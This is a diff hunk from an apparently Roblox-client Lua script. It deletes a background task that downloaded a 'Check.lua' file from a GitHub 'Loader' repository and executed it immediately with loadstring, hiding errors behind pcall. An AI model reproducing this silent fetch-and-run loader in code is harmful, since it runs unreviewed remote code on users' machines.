@@ -67,15 +67,6 @@ end
 Port = Get_port(username) or 5000
 print(Port)
 
-task.spawn(function()
-    local success, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NopNopA/Loader/refs/heads/main/Check.lua"))()
-    end)
-    if not success then
-        warn("Error running script in background: " .. tostring(result))
-    end
-end)
-
 local function checkForError()
     game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
         if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
